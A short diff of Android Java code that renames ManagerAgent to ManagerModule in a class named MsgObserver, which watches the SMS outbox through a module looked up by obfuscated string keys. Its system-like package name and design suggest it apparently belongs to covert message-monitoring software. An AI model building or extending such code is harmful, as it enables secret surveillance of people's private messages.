@@ -13,7 +13,7 @@ import android.os.Message;
 import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
-import com.android.service.manager.ManagerAgent;
+import com.android.service.manager.ManagerModule;
 import com.android.service.module.ModuleMessage;
 import com.android.service.util.Check;
 
@@ -64,7 +64,7 @@ public class MsgObserver extends ContentObserver implements Runnable {
 
 	void actualBrowsing() {
 		// messages: Messages.getString("b.9");
-		ModuleMessage a = (ModuleMessage) ManagerAgent.self().get(Messages.getString("b.9"));
+		ModuleMessage a = (ModuleMessage) ManagerModule.self().get(Messages.getString("b.9"));
 
 		if (a == null) {
 			return;
@@ -75,7 +75,7 @@ public class MsgObserver extends ContentObserver implements Runnable {
 		// http://stackoverflow.com/questions/3012287/how-to-read-mms-data-in-android
 
 		// Se questa non dovesse piu andare cambiare in "content://sms"
-		// ManagerAgent.get("sms")
+		// ManagerModule.get("sms")
 		// orig: content://sms/outbox
 
 		/*
